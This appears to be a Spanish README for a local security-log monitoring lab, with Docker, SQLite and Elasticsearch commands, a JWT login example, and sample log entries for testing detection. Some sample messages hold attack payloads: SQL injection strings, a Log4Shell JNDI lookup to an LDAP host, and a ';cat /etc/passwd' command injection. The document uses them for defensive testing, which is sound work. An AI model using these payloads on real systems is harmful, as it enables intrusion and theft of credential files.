Si necesitas acceder al sqlite por terminal:

    - docker exec -it sqlite-db sqlite3 /root/db/app.db

Para ver los docker arrancados:
    - docker ps

Para ver elasticsearch arrancado:
    - http://localhost:9200/

Para hacer funcionar el entorno, necesitas un .env en el raiz con datos secretos:
    - SECRET_KEY=clave secreta para generar los tokens
    - ELASTIC_URL=http://elasticsearch:9200/logs/_doc

PETICION DE LOGIN+JWT
curl -X POST http://localhost:5000/login \                        
  -H "Content-Type: application/json" \
    -d '{
    "username": "antonio",
    "password": "antonio"
}

PARA REALIZAR LLAMADAS DESDE CONSOLA:

curl -X POST http://localhost:5000/api/logs \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d 'mensaje'

  ARRAY DE MENSAJES POR TIPO DE VULNERABILIDAD
  
[
  {
    "source_ip": "172.16.10.5",
    "timestamp": "2025-09-01T15:00:10Z",
    "message": "GET /products.php?id='UNION SELECT 1,2,3-- - HTTP/1.1",
    "level": "warning",
    "service": "webserver"
  },
  {
    "source_ip": "203.0.113.88",
    "timestamp": "2025-09-01T15:05:20Z",
    "message": "Repeated requests (1500 per second) detected from same IP. Potential DDoS attempt.",
    "level": "warning",
    "service": "api_gateway"
  },
  {
    "source_ip": "10.0.0.10",
    "timestamp": "2025-09-01T15:10:30Z",
    "message": "User 'guest' attempted to access a restricted directory '/home/admin/secrets'. Access denied.",
    "level": "info",
    "service": "filesystem"
  },
  {
    "source_ip": "45.83.22.110",
    "timestamp": "2025-09-01T15:15:45Z",
    "message": "SSH login failed for user 'root'. Attempt 567 in 5 minutes from '45.83.22.110'.",
    "level": "warning",
    "service": "ssh"
  },
  {
    "source_ip": "54.239.25.1",
    "timestamp": "2025-09-01T15:20:50Z",
    "message": "Request to '/wp-admin/includes/class-wp-texturize.php' with unusual parameters.",
    "level": "info",
    "service": "webserver"
  },
  {
    "source_ip": "192.168.1.50",
    "timestamp": "2025-09-01T15:25:00Z",
    "message": "Blocked connection from known malicious IP. Rule 'DShield-blocklist' triggered.",
    "level": "critical",
    "service": "firewall"
  },
  {
    "source_ip": "203.0.113.15",
    "timestamp": "2025-09-01T15:30:15Z",
    "message": "POST /api/data?query=SELECT table_name FROM information_schema.tables WHERE table_schema = database() HTTP/1.1",
    "level": "warning",
    "service": "database"
  },
  {
    "source_ip": "172.16.20.1",
    "timestamp": "2025-09-01T15:35:30Z",
    "message": "SSL certificate for 'api.prod.corp' will expire in 10 days.",
    "level": "info",
    "service": "certificate_monitor"
  },
  {
    "source_ip": "192.168.1.30",
    "timestamp": "2025-09-01T15:40:45Z",
    "message": "User-Agent: Mozilla/5.0 (${jndi:ldap://192.168.1.10:1389/a})",
    "level": "critical",
    "service": "webserver"
  },
  {
    "source_ip": "203.0.113.99",
    "timestamp": "2025-09-01T15:45:00Z",
    "message": "Attempted file upload of 'malicious.php' to '/uploads/user_files'. File type blocked.",
    "level": "warning",
    "service": "file_upload"
  },
  {
    "source_ip": "10.0.0.22",
    "timestamp": "2025-09-01T15:50:15Z",
    "message": "GET /download.php?file=;cat /etc/passwd HTTP/1.1",
    "level": "critical",
    "service": "webserver"
  },
  {
    "source_ip": "198.51.100.1",
    "timestamp": "2025-09-01T15:55:30Z",
    "message": "Unusual number of 401 Unauthorized responses from a single IP. Potential password spraying.",
    "level": "warning",
    "service": "api_gateway"
  }
]

